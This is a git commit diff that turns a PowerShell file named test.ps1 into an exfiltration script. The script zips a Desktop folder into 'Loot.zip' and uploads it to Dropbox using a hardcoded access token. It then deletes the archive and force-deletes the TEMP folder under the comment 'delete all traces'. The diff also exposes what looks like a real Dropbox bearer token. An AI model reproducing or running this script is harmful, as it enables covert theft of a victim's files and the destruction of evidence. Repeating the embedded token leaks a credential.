8ee4b7422b9c47d0a3b2c8a9f76d5c6fe90ca25c
Paddlboat <66689038+Paddlboat@users.noreply.github.com>
2022-11-27 15:16:08 +0100

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,7 +1,43 @@
-#starts notepad
-start notepad
+#Grabs everything from the selected directory and compresses it into a .zip file
+
+$compress = @{
+  Path = $env:USERPROFILE + "\Desktop\SysinternalsSuite"
+  CompressionLevel = "Fastest"
+  DestinationPath = $env:USERPROFILE + "\Desktop\Loot.zip"
+}
+Compress-Archive @compress
+
+#Upload to Dropbox or other filesharing service [DROPBOX ACCESS TOKEN IS ONLY VALID FOR 4H]
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$DropBoxAccessToken = "sl.BT58RBptIKclSXTS-sFpF6QqC18-qHXnnlEmL3OGDxdpDsmfW51x792ESH-flkB4MIzj4genxD7nphJwP03CVXDGGqHgYjkpHpZ_Jcn__DBWIJ0x22LYsYnC2g5uIXXqY7TENTfCIHzl"
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $DropBoxAccessToken
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+$env:USERPROFILE + "\Desktop\Loot.zip" | DropBox-Upload
 
 #delete all traces
+
+#delay
+Start-Sleep -Seconds 3
+
+#delete created archive
+Remove-Item -Path $env:USERPROFILE"\Desktop\Loot.zip"
 
 #temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
